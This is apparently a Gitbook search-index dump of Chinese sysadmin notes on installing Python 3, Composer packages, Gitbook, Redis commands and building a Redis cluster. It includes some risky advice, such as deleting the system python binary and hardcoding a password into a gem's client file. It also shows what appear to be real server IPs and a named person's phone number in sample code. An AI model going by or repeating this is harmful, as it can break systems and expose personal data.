我们只要到/etc/yum.repo.s下面把packetxxxx.repo和redhat.repo两个文件删除掉，再启动就可以了. Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"mysql-lb/pxc/":{"url":"mysql-lb/pxc/","title":"数据库集群方案","keywords":"","body":"数据库集群方案 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"mysql-lb/数据库迁移/":{"url":"mysql-lb/数据库迁移/","title":"windows 快速导入mysql","keywords":"","body":"windows 快速导入mysql https://jingyan.baidu.com/article/295430f1ef89ab0c7f00505a.html source C:\\Users\\mdshi\\Desktop\\yysys-WWW-2018-04-09_03.00.01.sql\\yysys-WWW-2018-04-09_03.00.01.sql Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"openstack/":{"url":"openstack/","title":"openstack","keywords":"","body":"openstack Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 17:23:35 "},"php-package/":{"url":"php-package/","title":"php包管理composer","keywords":"","body":"php包管理composer composer下载的是官网的代码，所以需要将代码同步到 Packagist php es搜索插件库参考 https://github.com/zouhuigang/php-esc Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"php-package/制作composer包.html":{"url":"php-package/制作composer包.html","title":"开发 composer 包有以下几个步骤：","keywords":"","body":"开发 composer 包有以下几个步骤： 初始化 composer.json 文件 定义命名空间及包名 实现包需要实现的功能 提交到 GitHub 在 Packagist 注册包 1.初始化 composer.json 文件 安装好 composer 后即可在本地运行 composer init 通过交互式命令行设置 composer.json cmd 进入D:\\www\\php-package\\elasticsearch # composer init Name:zouhuigang/php-package/elasticsearch #这里填写/的信息 Description：\"es search package\" #包的描述 Author [zouhuiang ]: #作者信息 Minimum Stability []: dev #最低稳定版本 Package Type (e.g. library, project, metapackage, composer-plugin) []: library #包类型 License []: MIT #授权协议 Define your dependencies. Would you like to define your dependencies (require) interactively [yes]? no Would you like to define your dev dependencies (require-dev) interactively [yes]? no #安装当前包所需的依赖。只有所有依赖被安装当前包才会被安装。 Do you confirm generation [yes]? yes 进过上面的步骤，即可生成一个composer.json 2.定义命名空间及包名 3.实现包需要实现的功能 4.提交到 GitHub 5.在 Packagist 注册包 手动提交： 1.打开 https://packagist.org/packages/submit 输入 https://github.com/zouhuigang/php-esc 提交即可 6.下载更新第三方包 cmd进入一个php项目，然后在项目根目录运行: #composer require zouhuigang/php-esc #composer update zouhuigang/php-esc composer require \"zouhuigang/php-esc:dev-master\" #下载dev版本,所以还是指定Minimum Stability:stable吧 7.引用文件，自动加载Php文件 在项目根目录编写加载文件ComposerAutoload.php： add('Bundles', __DIR__ . '/vendor'); ?> 然后在index.php中添加下列代码： require_once __DIR__ . '/ComposerAutoload.php'; 8.测试运行 参考文档： http://blog.zhengshuiguang.com/php/packagist.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"phpexcel/":{"url":"phpexcel/","title":"phpexcel有内存泄漏的问题，每次执行完成之后，服务器内存就会被占用很多，所以上传excel多了，就会解析有问题","keywords":"","body":"phpexcel有内存泄漏的问题，每次执行完成之后，服务器内存就会被占用很多，所以上传excel多了，就会解析有问题 本例子换了个库，改了配置，还是没法解决这个问题，所以先留着测试文件，之后再通过其他语言来解释excel吧 目前的解决方案是，在Linux服务器上，设置一个定时任务，当php-fpm占用内存大于多少的时候，及时把该进程给杀死。 将配置文件上传到服务器 ​ chmod +x kill_php-fpm_big_memory.sh ​ ./kill_php-fpm_big_memory.sh Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"post/gitbook.html":{"url":"post/gitbook.html","title":"gitbook的使用","keywords":"","body":"gitbook的使用 安装: sudo cnpm install gitbook-cli -g 安装指定版本: gitbook fetch 3.2.3 使用 初始化: gitbook init 生成Html: gitbook build 本地预览: gitbook serve 浏览器访问: http://localhost:4000/ 安装插件： gitbook install 写一本书 目录结构： ├── book.json ##存放站点配置信息，例如:标题、作者、描述、插件、语言、版本、导航等 ├── README.md ##书籍的简单介绍 ├── SUMMARY.md ##定义目录结构的文件，文档左侧的目录就是根据这个文件来生成的，是用Markdown语法来定义目录树的父子关系的。 ├── Glossary.md ##词汇表文件，用于常用存储词汇信息。 ├── chapter-1/ | └── something.md └── chapter-2/ └── something.md book.json { \"title\": \"Common\", ##标题 \"description\": \"公共文档\", ##简述 \"author\": \"Common\", ##作者 \"language\": \"zh-hans\", ##语言 \"gitbook\": \"3.2.3\", ##版本 \"root\": \".\", \"structure\": { \"readme\": \"README.md\" }, \"links\": { ##左侧导航栏信息 \"sidebar\": { \"Home\": \"xxx\" } }, \"plugins\": [ ##-：表示关闭此插件 \"-lunr\", \"-search\", \"highlight\", ##语法高亮 \"-livereload\", \"-sharing\", \"search-plus\", ##支持中文搜索 \"simple-page-toc\", ##自动生成本页目录结构 \"advanced-emoji\", ##支持emoji表情 \"anchors\", ##Github 风格的锚点样式 \"include-codeblock\", ##插入代码块 \"ace\", ##支持ace \"emphasize\", ##文字加底色 \"katex\", ##数学公式插件 \"splitter\", ##侧边栏宽度可自由调节 \"tbfed-pagefooter\", ##添加脚页 \"expandable-chapters-small\", ##目录可折叠 \"sectionx\", ##页面分块显示 \"local-video\", ##视频插件(Video.js播放) \"anchor-navigation-ex\", ##悬浮导航 \"todo\", ##ToDo显示功能 \"git-author\", ##显示创建、修改记录 \"alerts\", ##不同alerts样式(info, warning, danger, success) \"include-csv\" ##支持展示csv文件 ], \"pluginsConfig\": { \"theme-default\": { \"showLevel\": true}, \"prism\": { \"css\": [ \"prism-themes/themes/prism-base16-ateliersulphurpool.light.css\" ] }, \"include-codeblock\": { \"template\": \"ace\", \"unindent\": true, \"edit\": true}, \"tbfed-pagefooter\": { \"copyright\": \"Copyright © xiaomi.com 2017\", \"modify_label\": \"文档修订时间：\", \"modify_format\": \"YYYY-MM-DD HH:mm:ss\" }, \"simple-page-toc\": { \"maxDepth\": 3, \"skipFirstH1\": true}, \"anchor-navigation-ex\": { \"showLevel\": false, \"multipleH1\":true, \"multipleH2\":true, \"multipleH3\":true, \"mode\": \"float\", \"float\": { \"showLevelIcon\": true, \"level1Icon\": \"fa fa-hand-o-right\", \"level2Icon\": \"fa fa-hand-o-right\", \"level3Icon\": \"fa fa-hand-o-right\" }, \"pageTop\": { \"showLevelIcon\": true, \"level1Icon\": \"fa fa-hand-o-right\", \"level2Icon\": \"fa fa-hand-o-right\", \"level3Icon\": \"fa fa-hand-o-right\" } }, \"sectionx\": { \"tag\": \"b\" }, \"favicon\": { \"shortcut\": \"favicon.ico\", \"bookmark\": \"favicon.ico\" }, \"git-author\":{ \"position\": \"bottom\", \"createTpl\": \"Created by {user}：{timeStamp}\", \"modifyTpl\": \"Modified by {user}：{timeStamp}\", \"timeStampFormat\": \"YYYY-MM-DD\" }, \"styles\": { \"website\": \"./styles/website.css\" }, \"pluginsConfig\": { \"include-codeblock\": { \"template\": \"ace\", \"unindent\": \"true\", \"theme\": \"monokai\" } } } } 运行: gitbook install 太慢了，用翻墙命令 proxychain4 gitbook install 会自动安装book.json中的插件 已有markdown，自动生成目录文件 安装到你的项目中。 sudo cnpm install --save summarybuilder 全局安装 sudo npm install -g summarybuilder 推荐 使用: summary -b -t Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"post/去掉gitbook Published with Gitbook的显示.html":{"url":"post/去掉gitbook Published with Gitbook的显示.html","title":"创建styles/website.css","keywords":"","body":"创建styles/website.css .gitbook-link { display: none !important; } 编辑book.json { \"styles\": { \"website\": \"styles/website.css\" } } Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-28 08:52:00 "},"python/":{"url":"python/","title":"centos安装python3","keywords":"","body":"centos安装python3 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"python/centos_python3.html":{"url":"python/centos_python3.html","title":"centos安装python3","keywords":"","body":"centos安装python3 cd ~ 下载 https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tgz 安装: tar xfz Python-3.7.0.tgz cd Python-3.7.0 ./configure --prefix=/usr/bin/python3.7 sudo make sudo make install 更改软链接,修改默认Python版本: ###sudo rm -rf /usr/bin/python(不要删除了) sudo mv /usr/bin/python /usr/bin/python2.7.5 ln -s /usr/bin/python3.7/bin/python3.7 /usr/bin/python python -V 解决yum不能使用的问题 因为yum包使用python2*等开发，修该为环境修改python3之后有问题，修改文件/usr/bin/yum、/usr/libexec/urlgrabber-ext-down头中相应python为#!/usr/bin/python2.7 解决： vi /usr/bin/yum #!/usr/bin/python2.7.5 vi /usr/libexec/urlgrabber-ext-down #!/usr/bin/python2.7.5 升降pip pip install --upgrade pip （升级） python -m pip install --user --upgrade pip==9.0.3 (降级) 问题汇总 Q： ModuleNotFoundError: No module named '_ctypes' A: yum install libffi-devel -y Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"python/flask.html":{"url":"python/flask.html","title":"安装flask","keywords":"","body":"安装flask pip install flask pip install -r requirements.txt 运行: python manage.py runserver python manage.py -c development # 开发环境运行 python manage.py -c testing # 测试环境运行 问题汇总: Q: 安装gevent error: command 'x86_64-linux-gnu-gcc' failed with exit status 1 A: (py3) zhg@zhg-ThinkPad-E450c:~/workspaces/py-test$ python -V Python 3.6.5 For Python 2.x use: $ sudo apt-get install python-dev For Python 2.7 use: $ sudo apt-get install libffi-dev For Python 3.x use: $ sudo apt-get install python3-dev For Python 3.4 use: $ sudo apt-get install python3.4-dev For Python 3.5 use: $ sudo apt-get install python3.5-dev For Python 3.6 use: $ sudo apt-get install python3.6-dev Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"python/ubuntu安装python3.html":{"url":"python/ubuntu安装python3.html","title":"升级python3，不要卸载python2,因为一些其他的系统需要python2","keywords":"","body":"升级python3，不要卸载python2,因为一些其他的系统需要python2 去官网下载最新的安装包： https://www.python.org/ 打开: https://www.python.org/downloads/release/python-370/ 选择: Gzipped source tarball 下载 下载完成，得到:Python-3.7.0.tgz tar xfz Python-3.7.0.tgz 这里使用xfz命令，而不建议使用-xvzf命令，因为其释放的文件夹需要root权限才可以更改或者删除。 cd /Python-3.7.0 ./configure --prefix=/usr/bin/python3.7 sudo make sudo make install 更改软链接,修改默认Python版本 sudo rm -rf /usr/bin/python ln -s /usr/bin/python3.7/bin/python3.7 /usr/bin/python 查看版本: python -V 安装之后，发现pip install 报错: Traceback (most recent call last): File \"/usr/bin/pip\", line 9, in from pip import main ImportError: cannot import name 'main' from 'pip' (/usr/bin/python3.7/lib/python3.7/site-packages/pip/__init__.py) 解决: $ sudo python -m pip --version pip 10.0.1 from /usr/bin/python3.7/lib/python3.7/site-packages/pip (python 3.7) # # $sudo python -m pip install numpy --upgrade 修改文件: sudo which pip vi /usr/bin/pip pip 10.0.0不支持main，下载低版本pip: python -m pip install --user --upgrade pip==9.0.3 再次查看版本: zhg@zhg-ThinkPad-E450c:~$ pip --version pip 9.0.3 from /home/zhg/.local/lib/python3.7/site-packages (python 3.7) Virtualenv 多版本python共用 验证是否安装: virtualenv --version ubuntu: pip install virtualenv 创建pyhon3虚拟环境（py3为虚拟环境名） virtualenv -p /usr/bin/python3 py3 创建python2虚拟环境（py2为虚拟环境名） virtualenv -p /usr/bin/python py2 启动虚拟环境 cd [虚拟环境名称]/ source bin/activate python -V 退出虚拟环境 deactivate https://blog.csdn.net/menciushometown/article/details/77688728 http://www.pythonforbeginners.com/basics/how-to-use-python-virtualenv/ Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"rabbitmq/":{"url":"rabbitmq/","title":"消息","keywords":"","body":"消息 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"redis/":{"url":"redis/","title":"windows版下载地址","keywords":"","body":"windows版下载地址 下载完成，安装即可！ 启动Redis客户端 cd D:\\software\\redis redis-cli 连接远程docker redis服务端: redis-cli -h 服务器地址 -p 端口 -a 密码 redis-cli -h 192.168.99.100 -p 6379 -a \"pass123\" 连接远程服务redis如图： 图片 - image 使用说明 设置: set 键 值 set realname zouhuigang 得到: get 键 get realname 获取所有的键值: keys * 查看键值的类型: type 键 删除: del 键 del realname hash(type==hash) 如果type是hash,包含哈希表中所有字段的列表。 当 key 不存在时，返回一个空列 列出所有值: HKEYS 键 hkeys myhash 1) \"field1\" 2) \"field2\" 设置hash值: HSET myhash field1 \"foo\" 库： Redis默认有16个库通过select命令切换，库之间隔离默认登录0号库 选择1号库: select 1 Redis Sadd 命令 (type==set) redis 127.0.0.1:6379> SADD myset \"hello\" (integer) 1 redis 127.0.0.1:6379> SADD myset \"foo\" (integer) 1 redis 127.0.0.1:6379> SADD myset \"hello\" (integer) 0 redis 127.0.0.1:6379> SMEMBERS myset 1) \"hello\" 2) \"foo\" list类型 Redis Lindex 命令用于通过索引获取列表中的元素。你也可以使用负数下标，以 -1 表示列表的最后一个元素， -2 表示列表的倒数第二个元素，以此类推 图片 - images 查看list中的第一个元素: LINDEX mylist 0 获取列表指定范围内的元素: LRANGE pingan:insert 0 10 lrange pingan:insert 0 -1 #查看所有元素 获取队列的长度: Llen pingan:insert 入队列： lpush pingan:insert aaaa 插入值(php代码): $insertArr=array(); $insertArr[\"siteid\"]=\"1062_1135\"; $insertArr[\"cname\"]=\"邹慧刚\"; $insertArr[\"sex\"]=\"男\"; $insertArr[\"telephone\"]=\"18516573852\"; $insertArr[\"birthday\"]=date(\"Y-m-d\",time()); $insertArr[\"adddate\"]=date(\"Y-m-d H:i:s\",time()); $json = json_encode($insertArr); $obj_cluster->lpush(\"pingan:insert\",$json); 问题汇总: Q1: (error) WRONGTYPE Operation against a key holding the wrong kind of value A1: 数据库中有一个key是usrInfo的数据存储的是Hash类型,执行数据 操作的时候却使用了非Hash的操作方法，比如Sorted Sets里的方法。此时就会报 ERR Operation against a key holding the wrong kind of value这个错误！ 参考文档 http://www.yiibai.com/redis/redis_quick_guide.html http://blog.csdn.net/qq_37610423/article/details/72660063 https://www.cnblogs.com/chrdai/p/6841474.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"redis/cluster.html":{"url":"redis/cluster.html","title":"redis集群的搭建","keywords":"","body":"redis集群的搭建 图片 - images 环境(2台服务器)： www: 139.196.16.67 (10.174.113.12) qa: 47.100.76.132 (10.81.128.152) 这里使用2台服务器 用两台虚拟机模拟6个节点，一台机器3个节点，创建出3 master、3 salve 环境。 安装 mkdir -p /home/redis && cd /home/redis wget http://download.redis.io/releases/redis-4.0.8.tar.gz tar xzf redis-4.0.8.tar.gz cd redis-4.0.8 make make install The binaries that are now compiled are available in the src directory. Run Redis with: src/redis-server 按照ruby环境，方便创建集群 #yum install -y ruby 此方法安装的是ruby 2.0.0 后面会提示版本太低了。最新版安装，参考ruby目录 yum install rubygems (ruby包的管理器,用来下载ruby的包) 安装ruby包redis.gem 仅需要在redis-cluster1服务器上安装gem redis (为来redis-trib可以执行)，其他服务器不用。 gem install redis 查看是否可用,redis-trib.rb 在源码目录 src下: cd /home/redis/redis-4.0.8/src ./redis-trib.rb help help，可以看到redis-trib.rb具有以下功能： 1、 create ：创建集群 2、 check ：检查集群 3、 info ：查看集群信息 4、 fix ：修复集群 5、 reshard ：在线迁移slot 6、 rebalance ：平衡集群节点slot数量 7、 add-node ：将新节点加入集群 8、 del-node ：从集群中删除节点 9、 set-timeout ：设置集群节点间心跳连接的超时时间 10、 call ：在集群全部节点上执行命令 11、 import ：将外部redis数据导入集群 创建集群,创建 Redis 节点 首先在 192.168.31.245 机器上 /home/redis/ 目录下创建 redis_cluster 目录； mkdir -p /home/redis/redis_cluster && cd /home/redis/redis_cluster 在 redis_cluster 目录下，创建名为7000、7001、7002的目录，并将 redis.conf 拷贝到这三个目录中 mkdir 7000 7001 7002 cp redis.conf redis_cluster/7000 cp redis.conf redis_cluster/7001 cp redis.conf redis_cluster/7002　　 分别修改redis.conf的配置文件,redis.conf默认文件在redis安装目录(/home/redis/redis-4.0.8)里面： port 7000 //端口7000,7002,7003 bind 10.81.128.152 //默认ip为127.0.0.1 需要改为其他节点机器可访问的ip 否则创建集群时无法访问对应的端口，无法创建集群 daemonize yes //redis后台运行 pidfile /var/run/redis_7000.pid //pidfile文件对应7000,7001,7002 cluster-enabled yes //开启集群 把注释#去掉 cluster-config-file nodes_7000.conf //集群的配置 配置文件首次启动自动生成 7000,7001,7002 cluster-node-timeout 15000 //请求超时 默认15秒，可自行设置 appendonly yes //aof日志开启 有需要就开启，它会每次写操作都记录一条日志　 www服务器 mkdir -p /mnt2/redis && cd /mnt2/redis wget http://download.redis.io/releases/redis-4.0.8.tar.gz tar xzf redis-4.0.8.tar.gz cd redis-4.0.8 make make install 修改配置: mkdir -p /mnt2/redis/redis_cluster && cd /mnt2/redis/redis_cluster cp redis.conf redis_cluster/7003 cp redis.conf redis_cluster/7004 cp redis.conf redis_cluster/7005 然后批量修改其中的ip和port等信息　　 启动集群 第一台机器上执行 redis-server /home/redis/redis_cluster/7000/redis.conf redis-server /home/redis/redis_cluster/7001/redis.conf redis-server /home/redis/redis_cluster/7002/redis.conf 第二台机器上执行 redis-server /mnt2/redis/redis_cluster/7003/redis.conf redis-server /mnt2/redis/redis_cluster/7004/redis.conf redis-server /mnt2/redis/redis_cluster/7005/redis.conf 检查 redis 启动情况 ps -ef | grep redis netstat -tnlp | grep redis 关闭redis pkill -9 redis 第一台服务器显示： [root@k8s-master1 redis]# ps -ef | grep redis root 8420 1 0 15:12 ? 00:00:00 redis-server 10.81.128.152:7000 [cluster] root 8449 1 0 15:12 ? 00:00:00 redis-server 10.81.128.152:7001 [cluster] root 8475 1 0 15:12 ? 00:00:00 redis-server 10.81.128.152:7002 [cluster] root 10406 7461 0 15:23 pts/1 00:00:00 grep --color=auto redis [root@k8s-master1 redis]# [root@k8s-master1 redis]# netstat -tnlp | grep redis tcp 0 0 10.81.128.152:7000 0.0.0.0:* LISTEN 8420/redis-server 1 tcp 0 0 10.81.128.152:7001 0.0.0.0:* LISTEN 8449/redis-server 1 tcp 0 0 10.81.128.152:7002 0.0.0.0:* LISTEN 8475/redis-server 1 tcp 0 0 10.81.128.152:17000 0.0.0.0:* LISTEN 8420/redis-server 1 tcp 0 0 10.81.128.152:17001 0.0.0.0:* LISTEN 8449/redis-server 1 tcp 0 0 10.81.128.152:17002 0.0.0.0:* LISTEN 8475/redis-server 1 [root@k8s-master1 redis]# 第二台服务器显示： [root@k8s-master-www redis_cluster]# ps -ef | grep redis root 5763 1 0 15:13 ? 00:00:00 redis-server 10.174.113.12:7003 [cluster] root 5859 1 0 15:13 ? 00:00:00 redis-server 10.174.113.12:7004 [cluster] root 5940 1 0 15:13 ? 00:00:00 redis-server 10.174.113.12:7005 [cluster] root 14759 24348 0 15:24 pts/0 00:00:00 grep --color=auto redis [root@k8s-master-www redis_cluster]# [root@k8s-master-www redis_cluster]# netstat -tnlp | grep redis tcp 0 0 10.174.113.12:17003 0.0.0.0:* LISTEN 5763/redis-server 1 tcp 0 0 10.174.113.12:17004 0.0.0.0:* LISTEN 5859/redis-server 1 tcp 0 0 10.174.113.12:17005 0.0.0.0:* LISTEN 5940/redis-server 1 tcp 0 0 10.174.113.12:7003 0.0.0.0:* LISTEN 5763/redis-server 1 tcp 0 0 10.174.113.12:7004 0.0.0.0:* LISTEN 5859/redis-server 1 tcp 0 0 10.174.113.12:7005 0.0.0.0:* LISTEN 5940/redis-server 1 [root@k8s-master-www redis_cluster]# 创建集群 Redis 官方提供了 redis-trib.rb 这个工具，就在解压目录的 src 目录中，第三步中已将它复制到 /usr/local/bin 目录中，可以直接在命令行中使用了。使用下面这个命令即可完成安装 cp /home/redis/redis-4.0.8/src/redis-trib.rb /usr/local/bin/　 #第一台服务器 redis-trib.rb create --replicas 1 10.81.128.152:7000 10.81.128.152:7001 10.81.128.152:7002 10.174.113.12:7003 10.174.113.12:7004 10.174.113.12:7005 其中，前三个 ip:port 为第一台机器的节点，剩下三个为第二台机器。 选项 --replicas 1 表示我们希望为集群中的每个主节点创建一个从节点,简单来说， 以上命令的意思就是让 redis-trib 程序创建一个包含三个主节点和三个从节点的集群。 启动显示: [root@k8s-master1 src]# redis-trib.rb create --replicas 1 10.81.128.152:7000 10.81.128.152:7001 10.81.128.152:7002 10.174.113.12:7003 10.174.113.12:7004 10.174.113.12:7005 >>> Creating cluster >>> Performing hash slots allocation on 6 nodes... Using 3 masters: 10.81.128.152:7000 10.174.113.12:7003 10.81.128.152:7001 Adding replica 10.174.113.12:7005 to 10.81.128.152:7000 Adding replica 10.81.128.152:7002 to 10.174.113.12:7003 Adding replica 10.174.113.12:7004 to 10.81.128.152:7001 M: 1de034f10dc64112d17508f9449d6348a009dd5a 10.81.128.152:7000 slots:0-5460 (5461 slots) master M: 93f83d01aed5ab5e6b0647ce8b32416d4d736130 10.81.128.152:7001 slots:10923-16383 (5461 slots) master S: 3c6be53c482dfdcc26bad8ee4ac539a25f1b002e 10.81.128.152:7002 replicates 751d9dc0c1d758145a885b8c2ad7127d881e13b0 M: 751d9dc0c1d758145a885b8c2ad7127d881e13b0 10.174.113.12:7003 slots:5461-10922 (5462 slots) master S: 4409835560b0b56d92bb9266278ea183eb03884f 10.174.113.12:7004 replicates 93f83d01aed5ab5e6b0647ce8b32416d4d736130 S: b00ceb42c0b70d5a1d0a871dbb7d40be84d886c0 10.174.113.12:7005 replicates 1de034f10dc64112d17508f9449d6348a009dd5a Can I set the above configuration? (type 'yes' to accept): yes 在上面输入yes: >>> Nodes configuration updated >>> Assign a different config epoch to each node >>> Sending CLUSTER MEET messages to join the cluster Waiting for the cluster to join..... >>> Performing Cluster Check (using node 10.81.128.152:7000) M: 1de034f10dc64112d17508f9449d6348a009dd5a 10.81.128.152:7000 slots:0-5460 (5461 slots) master 1 additional replica(s) S: b00ceb42c0b70d5a1d0a871dbb7d40be84d886c0 10.174.113.12:7005 slots: (0 slots) slave replicates 1de034f10dc64112d17508f9449d6348a009dd5a M: 93f83d01aed5ab5e6b0647ce8b32416d4d736130 10.81.128.152:7001 slots:10923-16383 (5461 slots) master 1 additional replica(s) S: 3c6be53c482dfdcc26bad8ee4ac539a25f1b002e 10.81.128.152:7002 slots: (0 slots) slave replicates 751d9dc0c1d758145a885b8c2ad7127d881e13b0 M: 751d9dc0c1d758145a885b8c2ad7127d881e13b0 10.174.113.12:7003 slots:5461-10922 (5462 slots) master 1 additional replica(s) S: 4409835560b0b56d92bb9266278ea183eb03884f 10.174.113.12:7004 slots: (0 slots) slave replicates 93f83d01aed5ab5e6b0647ce8b32416d4d736130 [OK] All nodes agree about slots configuration. >>> Check for open slots... >>> Check slots coverage... [OK] All 16384 slots covered. [root@k8s-master1 src]# 这表示集群中的 16384 个槽都有至少一个主节点在处理， 集群运作正常 集群验证 在第一台机器上连接集群的7002端口的节点，在另外一台连接7005节点，连接方式为 redis-cli -h 10.81.128.152 -c -p 7002 加参数 -C 可连接到集群，因为上面 redis.conf 将 bind 改为了ip地址，所以 -h 参数不可以省略。 说明：-h+host –p+端口号 –c 是要连接集群，注意坑，不加会报错的 另外一台连接7005端口（ 在7005节点执行命令）： redis-cli -h 10.174.113.12 -c -p 7005 > set hello world 图片 - images 第一台服务器查看刚刚设置的值: get hello 日志： [root@k8s-master1 src]# redis-cli -h 10.81.128.152 -c -p 7002 10.81.128.152:7002> get hello -> Redirected to slot [866] located at 10.81.128.152:7000 \"world\" 10.81.128.152:7000> get hello \"world\" set name andy 根据name值会落在7003端口中 get name 会从7003中查询出值 说明集群运作正常。 简单说一下原理 redis cluster在设计的时候，就考虑到了去中心化，去中间件，也就是说，集群中的每个节点都是平等的关系，都是对等的，每个节点都保存各自的数据和整个集群的状态。每个节点都和其他所有节点连接，而且这些连接保持活跃，这样就保证了我们只需要连接集群中的任意一个节点，就可以获取到其他节点的数据。 Redis 集群没有并使用传统的一致性哈希来分配数据，而是采用另外一种叫做哈希槽 (hash slot)的方式来分配的。redis cluster 默认分配了 16384 个slot，当我们set一个key 时，会用CRC16算法来取模得到所属的slot，然后将这个key 分到哈希槽区间的节点上，具体算法就是：CRC16(key) % 16384。所以我们在测试的时候看到set 和 get 的时候，直接跳转到了7000端口的节点。 Redis 集群会把数据存在一个 master 节点，然后在这个 master 和其对应的salve 之间进行数据同步。当读取数据时，也根据一致性哈希算法到对应的 master 节点获取数据。只有当一个master 挂掉之后，才会启动一个对应的 salve 节点，充当 master 。 需要注意的是：必须要3个或以上的主节点，否则在创建集群时会失败，并且当存活的主节点数小于总节点数的一半时，整个集群就无法提供服务了。 外网访问 iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 7000 -j ACCEPT 修复集群 官方是推荐使用redis-trib.rb fix 来修复集群…. …. 通过cluster nodes看到7001这个节点被干掉了… 那么 redis-trib.rb fix 127.0.0.1:7001 如果还是启动不了的话，可以把相关的cluster-config-file节点同步信息删掉 增加节点(默认add-node是添加主master节点): redis-trib.rb add-node 127.0.0.1:7006 增加从节点: redis-trib.rb add-node –slave –master-id 'ee05942ee38a56421a07eea01bc6072fe5e23bfd' 127.0.0.1:7008 127.0.0.1:7000 检查节点: redis-trib.rb check 127.0.0.1:7000 删除节点: redis-trib.rb del-node 127.0.0.1:7007 设置访问密码 1.如果是使用redis-trib.rb工具构建集群，集群构建完成前不要配置密码，集群构建完毕再通过config set + config rewrite命令逐个机器设置密码 2.如果对集群设置密码，那么requirepass和masterauth都需要设置，否则发生主从切换时，就会遇到授权问题，可以模拟并观察日志 3.各个节点的密码都必须一致，否则Redirected就会失败 方式一：修改所有Redis集群中的redis.conf配置文件： masterauth passwd123 requirepass passwd123 说明：这种方式需要重新启动各节点 方式二：进入各个实例进行设置 (采用这种方式，不用重启)： ./redis-cli -c -p 7000 config set masterauth passwd123 config set requirepass passwd123 config rewrite 之后分别使用./redis-cli -c -p 7001，./redis-cli -c -p 7002…..命令给各节点设置上密码 注意：各个节点密码都必须一致，否则Redirected就会失败， 推荐这种方式，这种方式会把密码写入到redis.conf里面去，且不用重启 密码验证 [root@k8s-master1 ~]# redis-cli -h 10.81.128.152 -c -p 7002 10.81.128.152:7002> keys * (error) NOAUTH Authentication required. 10.81.128.152:7002> 使用密码认证登录，并验证操作权限： $ redis-cli -h 10.81.128.152 -c -p 7002 -a myPassword 127.0.0.1:6379> config get requirepass 1) \"requirepass\" 2) \"myPassword\" 看到类似上面的输出，说明Reids密码认证配置成功。 设置密码之后如果需要使用redis-trib.rb的各种命令 如：redis-trib.rb check 127.0.0.1，则会报错ERR] Sorry, can’t connect to node 127.0.0.1:7000 解决办法： vim /usr/lib/ruby/gems/1.8/gems/redis-3.3.0/lib/redis/client.rb,然后修改passord class Client DEFAULTS = { :url => lambda { ENV[\"REDIS_URL\"] }, :scheme => \"redis\", :host => \"127.0.0.1\", :port => 6379, :path => nil, :timeout => 5.0, :password => \"passwd123\", :db => 0, :driver => nil, :id => nil, :tcp_keepalive => 0, :reconnect_attempts => 1, :inherit_socket => false } 其他命令 [root@k8s-master-www redis_cluster]# redis-cli -h 10.174.113.12 -c -p 7005 10.174.113.12:7005> cluster nodes b00ceb42c0b70d5a1d0a871dbb7d40be84d886c0 10.174.113.12:7005@17005 myself,slave 1de034f10dc64112d17508f9449d6348a009dd5a 0 1517820001000 6 connected 93f83d01aed5ab5e6b0647ce8b32416d4d736130 10.81.128.152:7001@17001 master - 0 1517820003274 2 connected 10923-16383 4409835560b0b56d92bb9266278ea183eb03884f 10.174.113.12:7004@17004 slave 93f83d01aed5ab5e6b0647ce8b32416d4d736130 0 1517820004275 5 connected 3c6be53c482dfdcc26bad8ee4ac539a25f1b002e 10.81.128.152:7002@17002 slave 751d9dc0c1d758145a885b8c2ad7127d881e13b0 0 1517820003000 4 connected 1de034f10dc64112d17508f9449d6348a009dd5a 10.81.128.152:7000@17000 master - 0 1517820003000 1 connected 0-5460 751d9dc0c1d758145a885b8c2ad7127d881e13b0 10.174.113.12:7003@17003 master - 0 1517820001000 4 connected 5461-10922 10.174.113.12:7005> 模拟oom redis-cli debug oom 模拟宕机 redis-cli -p 7002 debug segfault 模拟hang redis-cli -p 6379 DEBUG sleep 30 问题汇总 Q1: /usr/share/rubygems/rubygems/core_ext/kernel_require.rb:55:in `require': cannot load such file -- redis (LoadError) A1: gem install redis 仅需要在redis-cluster1服务器上安装gem redis (为来redis-trib可以执行)，其他服务器不用。 如果提示： redis requires Ruby version >= 2.2.2. 则需要更新ruby版本 参考文档 https://www.cnblogs.com/lihaoyang/p/6906444.html http://blog.csdn.net/dream_an/article/details/77199462 http://blog.topspeedsnail.com/archives/7274 https://www.cnblogs.com/wuxl360/p/5920330.html http://redisdoc.com/topic/cluster-tutorial.html http://www.chuodu.com/693.html http://elvis4139.iteye.com/blog/2404696 http://xiaorui.cc/2015/05/19/%E4%BD%BF%E7%94%A8redis-trib-fix%E5%91%BD%E4%BB%A4%E4%BF%AE%E5%A4%8Dredis-cluster%E8%8A%82%E7%82%B9/ http://xiaorui.cc/2015/05/16/%e9%80%9a%e8%bf%87redis-trib-rb%e8%84%9a%e6%9c%ac%e6%9e%84%e5%bb%ba%e5%b9%b6%e5%a2%9e%e5%88%a0%e6%94%b9%e6%9f%a5redis-cluster%e9%9b%86%e7%be%a4/ http://blog.csdn.net/zsg88/article/details/73732845 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 